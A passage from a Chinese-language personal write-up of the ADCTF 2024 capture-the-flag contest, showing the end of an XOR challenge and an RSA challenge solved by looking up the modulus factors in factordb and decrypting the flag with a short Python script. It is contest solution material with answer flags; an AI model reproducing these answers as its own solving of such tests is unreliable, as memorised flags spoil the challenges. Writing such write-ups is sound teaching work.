class="subst">&#123;decrypted_text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现key为134号字符，flag为<code>flag&#123;eazy_xor&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_tt8hSKycoU.png"></p>
<h2 id="Normal-Check-Your-Factor-Database"><a href="#Normal-Check-Your-Factor-Database" class="headerlink" title="[Normal] Check_Your_Factor_Database"></a><strong>[Normal]</strong> Check_Your_Factor_Database</h2><p>题目代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> p, q, flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 15583202069585885743329731770693703651315744619547748987654328267750897298525457052637246322711018450296389785154280944187494218432166414466847580546888232777346390261326052791442303045476056323506639620708060686276665740035963899932923469306092864734507521103929958343335077640138132147823877965255516681640595305323863184079626094607124637572731263072411094986661513874040186660293323912225991096820508525802441998965552628844336066341624032465148749156118031186277077034218599879172143727672732486930547036361186338853567795815703079141657486772887537131798381857481761128761701947613223163957583789997131996194389</span></span><br><span class="line"><span class="comment"># c = 6371306651441414494898158050750379466411385075727176973777141489866804949152371066737700949957382328723739039588265348722939538409644758452741820636286764732056622302045805546424342834578149204912690500590371488794741154219116429974884626176276687505603436615961383352315424341433102202637442619829308641010524729990244179166911981814627661923080609365126766407039132426191716113002194884261389976932121106269022968620075855360220818974890016650718871530138072213210849868914955977855950213371455369372213479451425395072947888041803100826574552594123357214975040806204084524320510358181592274275785398054808107630303</span></span><br></pre></td></tr></table></figure>

<p>题目告诉我们查数据库（<a href="http://www.factordb.com/">http://www.factordb.com/</a> ），我查到n可以分解为下面两个因子，经过验证是正确的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">102786970188634214370227829796268661753428191750544697648009912021832510479846406842660652442082773578020088104585096298944409097150001317920480815093132150004913448767202198299893840769568841219755466694275862843676241177608436424364735585247574303039353776987581503833128444693347920806395102183872665901277</span></span><br><span class="line">b= <span class="number">151606784799548610095916644217950865940397761353988655007201180031392776522565708552689972206548545357755036833336762542306291348158476176958083317845208464472445906639525228156065966245815886462442808969891370598247564766047649027653895495777728985622422940233924415769188183003695053034562331004932104400857</span></span><br><span class="line">n = <span class="number">15583202069585885743329731770693703651315744619547748987654328267750897298525457052637246322711018450296389785154280944187494218432166414466847580546888232777346390261326052791442303045476056323506639620708060686276665740035963899932923469306092864734507521103929958343335077640138132147823877965255516681640595305323863184079626094607124637572731263072411094986661513874040186660293323912225991096820508525802441998965552628844336066341624032465148749156118031186277077034218599879172143727672732486930547036361186338853567795815703079141657486772887537131798381857481761128761701947613223163957583789997131996194389</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n == a * b)</span><br></pre></td></tr></table></figure>

<p>所以直接梭哈</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的 n 的因子 a 和 b</span></span><br><span class="line">a = <span class="number">102786970188634214370227829796268661753428191750544697648009912021832510479846406842660652442082773578020088104585096298944409097150001317920480815093132150004913448767202198299893840769568841219755466694275862843676241177608436424364735585247574303039353776987581503833128444693347920806395102183872665901277</span></span><br><span class="line">b = <span class="number">151606784799548610095916644217950865940397761353988655007201180031392776522565708552689972206548545357755036833336762542306291348158476176958083317845208464472445906639525228156065966245815886462442808969891370598247564766047649027653895495777728985622422940233924415769188183003695053034562331004932104400857</span></span><br><span class="line">n = a * b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 公钥 e</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 φ(n)</span></span><br><span class="line">phi_n = (a - <span class="number">1</span>) * (b - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥 d</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文 c</span></span><br><span class="line">c = <span class="number">6371306651441414494898158050750379466411385075727176973777141489866804949152371066737700949957382328723739039588265348722939538409644758452741820636286764732056622302045805546424342834578149204912690500590371488794741154219116429974884626176276687505603436615961383352315424341433102202637442619829308641010524729990244179166911981814627661923080609365126766407039132426191716113002194884261389976932121106269022968620075855360220818974890016650718871530138072213210849868914955977855950213371455369372213479451425395072947888041803100826574552594123357214975040806204084524320510358181592274275785398054808107630303</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密 c 得到 m</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换 m 为明文</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到flag为<code>flag&#123;factor_db_is_useful&#125;</code></p>
<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1><p>最终战果如图，周日早八晚五直接少了好几个做题时，算啦，老二就老二吧 &#x3D;-&#x3D;</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/gYBwA3QYTf.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://github.com/GamerNoTitle">GamerNoTitle</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://bili33.top/posts/ADCTF2024-Writeup/">https://bili33.top/posts/ADCTF2024-Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/ADCTF/">ADCTF</a></div><div class="post_share"><div class="social-share" data-image="https://assets.bili33.top/img/ADCTF2024-Writeup/msedge_5Mr1PCe98I.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://assets.bili33.top/img/Payments/WeChat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Payments/WeChat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://assets.bili33.top/img/Payments/AliPay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Payments/AliPay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/GDUTCTF2024-Writeup/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/GDUTCTF2024-Writeup/msedge_ERU4gurFl9.png" onerror="onerror=null;src='https://assets.bili33.top/img/404/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">2024年 GDUTCTF 个人WriteUp</div></div></a></div><div class="next-post pull-right"><a href="/posts/Flashing-Openwrt-on-Redmi-AX6000/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Flashing-Openwrt-on-Redmi-AX6000/msedge_uAdiXvdFLs.png" onerror="onerror=null;src='https://assets.bili33.top/img/404/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">从零开始！在红米AX6000路由器上刷入Openwrt</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/Creating-Challenges-for-ADCTF2025/" title="ADCTF 2025 个人出题记录"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Creating-Challenges-for-ADCTF2025/cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="title">ADCTF 2025 个人出题记录</div></div></a></div><div><a href="/posts/BaseCTF2024-Writeup/" title="BaseCTF2024 个人Writeup"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/BaseCTF2024-Week1/msedge_uIfC9jDQCq.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-30</div><div class="title">BaseCTF2024 个人Writeup</div></div></a></div><div><a href="/posts/CTF-20220529/" title="2022年全国大学生信息安全竞赛创新实践能力赛初赛 —— 部分WriteUp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Top-img/NEKO-Hackers-Edited.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-29</div><div class="title">2022年全国大学生信息安全竞赛创新实践能力赛初赛 —— 部分WriteUp</div></div></a></div><div><a href="/posts/CTF-20220619/" title="2022年全国大学生信息安全竞赛创新实践能力赛 —— 复赛WriteUp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-20220619/Cover.jpg?download=true" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-19</div><div class="title">2022年全国大学生信息安全竞赛创新实践能力赛 —— 复赛WriteUp</div></div></a></div><div><a href="/posts/CTF-20220826-wangdingcup-qinglong/" title="2022网鼎杯青龙组——个人WriteUP"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Top-img/NEKO-Hackers-Edited.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-26</div><div class="title">2022网鼎杯青龙组——个人WriteUP</div></div></a></div><div><a href="/posts/CTF-CCSSSC2025-National-Finals/" title="第十八届软件系统安全赛 CCSSSC 2025 全国总决赛复盘（旅行日记）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-CCSSSC2025-National-Finals/1748174171442.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-25</div><div class="title">第十八届软件系统安全赛 CCSSSC 2025 全国总决赛复盘（旅行日记）</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/AboutMe/logo-mini.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/link/Akarin.webp'" alt="avatar"/></div><div class="author-info__name">GamerNoTitle</div><div class="author-info__description">TECH OTAKUS SAVE THE WORLD</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">140</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">188</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><a id="card-info-btn" href="https://github.com/GamerNoTitle"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/GamerNoTitle" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://space.bilibili.com/44666814" target="_blank" title="bilibili"><i class="fas fa-tv"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a><a class="social-icon" href="mailto:GamerNoTitle@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content"><div align="center"><pre style="font-family: monospace; white-space: pre; line-height: 1 !important;">
.------.--------.---------.
| .=====================. |\
| | 7  3  5  5  6  0  8 | | |
| +=====================+ | |
|----------------------\\-. |
|    *   |      ^|^    || |\|
|   .-----------------.|| | |
|   |  1  |  2  |  3  ||| | |
|   |-----+-----+-----||| | |
|   |  4  |  5  |  6  ||| | |
|   |-----+-----+-----||| | |
|   |  7  |  8  |  9  ||| | |
|   |-----+-----+-----|// | |
|   |  *  |  0  |  #  |/  | |
|   +-----------------+   | |
|       |       |         | |
+-------+-------+---------+ |
\______\_______\_________+\/
</pre></div>
<div align="center"><span style="color: #e9b891;">gamernotitle</span>@<span style="color: #c5966d;">site_web</span> > <span style="color: #4a6d42;">./plant.sh</span><br>
Boom has been planted.
</div>
</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-nolibc"><span class="toc-number">1.1.</span> <span class="toc-text">[Easy] nolibc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-py-jail"><span class="toc-number">1.2.</span> <span class="toc-text">[Easy] py_jail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-Black-MIDI-Bad-Apple"><span class="toc-number">1.3.</span> <span class="toc-text">[Easy] [Black MIDI] Bad Apple!!</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-Sign-in-ADCTF"><span class="toc-number">2.1.</span> <span class="toc-text">[Easy] Sign_in_ADCTF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-sst1"><span class="toc-number">2.2.</span> <span class="toc-text">[Easy] sst1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-lottery"><span class="toc-number">2.3.</span> <span class="toc-text">[Easy] lottery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Normal-sst2"><span class="toc-number">2.4.</span> <span class="toc-text">[Normal] sst2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-onlineJava"><span class="toc-number">2.5.</span> <span class="toc-text">[Easy] onlineJava</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-xxe"><span class="toc-number">2.6.</span> <span class="toc-text">[Easy] xxe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#try-dtd"><span class="toc-number">2.6.1.</span> <span class="toc-text">try.dtd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tmpass-xml"><span class="toc-number">2.6.2.</span> <span class="toc-text">tmpass.xml</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-meow"><span class="toc-number">3.1.</span> <span class="toc-text">[Easy] meow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-binsh"><span class="toc-number">3.2.</span> <span class="toc-text">[Easy] binsh</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E5%81%9A%E6%B3%95"><span class="toc-number">3.2.1.</span> <span class="toc-text">非预期做法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E5%81%9A%E6%B3%95"><span class="toc-number">3.2.2.</span> <span class="toc-text">预期做法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-ret2text%EF%BC%88%E8%B5%9B%E5%90%8E%E5%87%BA%EF%BC%89"><span class="toc-number">3.3.</span> <span class="toc-text">[Easy] ret2text（赛后出）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-number">4.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-checkin"><span class="toc-number">4.1.</span> <span class="toc-text">[Easy] checkin</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-number">5.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Normal-Use-Many-Time"><span class="toc-number">5.1.</span> <span class="toc-text">[Normal] Use_Many_Time</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Normal-Too-Close-To-Sqrt"><span class="toc-number">5.2.</span> <span class="toc-text">[Normal] Too_Close_To_Sqrt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Normal-One-Way-Function"><span class="toc-number">5.3.</span> <span class="toc-text">[Normal] One_Way_Function</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BA%BB%E7%83%A6%E7%82%B9%E7%9A%84%E5%81%9A%E6%B3%95"><span class="toc-number">5.3.1.</span> <span class="toc-text">麻烦点的做法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%82%B9%E7%9A%84%E5%81%9A%E6%B3%95"><span class="toc-number">5.3.2.</span> <span class="toc-text">简单点的做法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Normal-One-Key-Pad"><span class="toc-number">5.4.</span> <span class="toc-text">[Normal] One_Key_Pad</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Normal-Check-Your-Factor-Database"><span class="toc-number">5.5.</span> <span class="toc-text">[Normal] Check_Your_Factor_Database</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#END"><span class="toc-number">6.</span> <span class="toc-text">END</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Migrate-from-Valine-to-Waline/" title="从 Valine 迁移到 Waline 全记录"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Migrate-from-Valine-to-Waline/msedge_1kiyjac8P9.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="从 Valine 迁移到 Waline 全记录"/></a><div class="content"><a class="title" href="/posts/Migrate-from-Valine-to-Waline/" title="从 Valine 迁移到 Waline 全记录">从 Valine 迁移到 Waline 全记录</a><time datetime="2026-02-15T19:00:46.000Z" title="Created 2026-02-16 03:00:46">2026-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Reverse-Engineering-Cracking-MailMaster/" title="记一次对某邮箱软件账户数量上限破解"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Reverse-Engineering-Cracking-MailMaster/at-748365_1920.jpg" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="记一次对某邮箱软件账户数量上限破解"/></a><div class="content"><a class="title" href="/posts/Reverse-Engineering-Cracking-MailMaster/" title="记一次对某邮箱软件账户数量上限破解">记一次对某邮箱软件账户数量上限破解</a><time datetime="2026-01-19T12:34:03.000Z" title="Created 2026-01-19 20:34:03">2026-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2025-Year-End-Summary/" title="2025 年终总结"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/2025-Year-End-Summary/image-20251231025211777.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="2025 年终总结"/></a><div class="content"><a class="title" href="/posts/2025-Year-End-Summary/" title="2025 年终总结">2025 年终总结</a><time datetime="2025-12-30T17:10:19.000Z" title="Created 2025-12-31 01:10:19">2025-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bkcrack-known-bytes-attack-decipher/" title="使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/bkcrack-known-bytes-attack-decipher/cover.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破"/></a><div class="content"><a class="title" href="/posts/bkcrack-known-bytes-attack-decipher/" title="使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破">使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破</a><time datetime="2025-12-19T12:59:03.000Z" title="Created 2025-12-19 20:59:03">2025-12-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/CTF-PCB2025-Preliminary-Round-Writeup/" title="2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-PCB2025-Preliminary-Round-Writeup/cover.jpg" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup"/></a><div class="content"><a class="title" href="/posts/CTF-PCB2025-Preliminary-Round-Writeup/" title="2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup">2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup</a><time datetime="2025-12-13T11:05:12.000Z" title="Created 2025-12-13 19:05:12">2025-12-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2026 By GamerNoTitle</div><div class="framework-info"><span>Framework </span><a href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">All articles in this blog are licensed under CC BY-NC-SA 4.0 unless stating additionally.<br>
<a href="https://icp.gov.moe/?keyword=20213338" target="_blank"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src='https://assets.bili33.top/img/GovMoe/icon120.png' width=20px height=20px></img> 萌ICP备 20213338号</a> | <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.bili33.top/gh/biliCDN/bilicdn.github.io@master/images/favicon.png" width="20px" height="20px"> 本站使用 <a href="https://cdn.bili33.top">哔哩CDN</a> 进行加速<br>
</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.bili33.top/npm/@fancyapps/ui@4.0.31/dist/fancybox.umd.min.js"></script><script src="https://cdn.bili33.top/npm/vanilla-lazyload@17.8.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.bili33.top/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.bili33.top/npm/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaidWrap.length) {
    window.runMermaid = () => {
      window.loadMermaid = true
      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

      Array.from($mermaidWrap).forEach((item, index) => {
        const mermaidSrc = item.firstElementChild
        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
        const mermaidID = 'mermaid-' + index
        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
        })
      })
    }

    const loadMermaid = () => {
      window.loadMermaid ? runMermaid() : getScript('https://cdn.bili33.top/npm/mermaid@9.1.7/dist/mermaid.min.js').then(runMermaid)
    }

    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
  }
})()</script><script>function loadWaline () {
